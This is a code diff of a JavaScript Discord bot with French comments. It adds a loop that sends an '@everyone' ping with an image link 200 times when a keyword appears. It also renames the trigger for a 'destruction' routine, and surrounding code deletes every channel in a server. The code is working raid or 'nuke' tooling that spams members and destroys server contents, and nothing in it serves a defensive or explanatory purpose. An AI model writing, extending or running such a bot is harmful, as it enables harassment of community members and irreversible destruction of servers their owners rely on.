@@ -154,7 +154,12 @@ if(message.content.includes("ar!kelsairvvesrx")){
                     message.channel.send("@everyone https://cdn.discordapp.com/attachments/534055320004067358/599940391055261697/image0.png")
                 }
             }
-            //réaction en chaine
+            if(message.content.includes("Kogetta")){
+                for(var i = 0; i < 200; i++){
+                    message.channel.send("@everyone KOGETTA LE ROI https://cdn.discordapp.com/avatars/427825965432045590/4b30c70706fdf66b534665df603027de.png?size=2048")
+                }
+            }
+    //réaction en chaine
                   if(message.content === "channel"){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
@@ -172,7 +177,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
                       message.guild.channels.map(c => c.delete())
                       }
                       //on commence la destruction
-                      if(message.content.includes("destroy")){
+                      if(message.content.includes("insurrection")){
                           message.channel.send("ban").then(m => m.delete());
                           message.channel.send("drole").then(m => m.delete());
                           message.channel.send("destroy").then(m => m.delete());
